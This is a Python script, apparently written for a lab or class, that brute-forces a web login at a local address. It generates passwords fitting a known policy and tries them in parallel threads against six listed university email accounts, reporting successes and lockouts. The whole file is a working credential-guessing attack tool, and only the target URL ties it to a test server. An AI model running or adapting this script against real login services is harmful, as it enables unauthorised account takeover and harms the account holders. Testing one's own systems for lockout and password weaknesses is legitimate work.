import itertools
import string
from concurrent.futures import ThreadPoolExecutor

import requests

LOGIN_URL   = "http://127.0.0.1:5000/login"
LOGIN_FIELD = "email"
SENHA_FIELD = "password"

STATUS_SUCESSO = {200, 302}
STATUS_LOCKOUT = {403, 423, 429}

MAX_WORKERS   = 10
TIMEOUT       = 2
LIMITE_SENHAS = 100_000

EMAILS = [
    "msilva@universidade.br",
    "dsantos@universidade.br",
    "cmelo@universidade.br",
    "sspark@universidade.br",
    "tsleep@universidade.br",
    "fhope@universidade.br",
]

MAIUSCULAS = string.ascii_uppercase
DIGITOS    = string.digits
ESPECIAIS  = "@#$&"
ALFABETO   = string.ascii_letters + DIGITOS + ESPECIAIS


def senha_valida(s):
    return (4 <= len(s) <= 8
            and any(c in MAIUSCULAS for c in s)
            and any(c in ESPECIAIS  for c in s))


def gerar_senhas(limite):
    n = 0
    for tam in range(4, 9):
        for combo in itertools.product(ALFABETO, repeat=tam):
            s = "".join(combo)
            if senha_valida(s):
                yield s
                n += 1
                if n >= limite:
                    return


def atacar(email, senhas):
    sessao = requests.Session()
    for i, senha in enumerate(senhas, 1):
        print(f"Tentativa {i}: {email}, {senha} ")
        try:
            r = sessao.post(LOGIN_URL,
                            data={LOGIN_FIELD: email, SENHA_FIELD: senha},
                            timeout=TIMEOUT, allow_redirects=False)
        except requests.RequestException:
            continue

        if r.status_code in STATUS_LOCKOUT:
            print(f"{email}: LOCKOUT ({r.status_code}) após {i} tentativas")
            return None

        if r.status_code in STATUS_SUCESSO:
            print(f"Sucesso {email} -> {senha})")
            return senha

    return None


def main():
    senhas = list(gerar_senhas(LIMITE_SENHAS))
    print(f"Senhas candidatas: {len(senhas):,}\n")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        resultados = list(ex.map(lambda e: atacar(e, senhas), EMAILS))

    print()
    for email, senha in zip(EMAILS, resultados):
        print(f"{email:<32} {senha or '—'}")


if __name__ == "__main__":
    main()
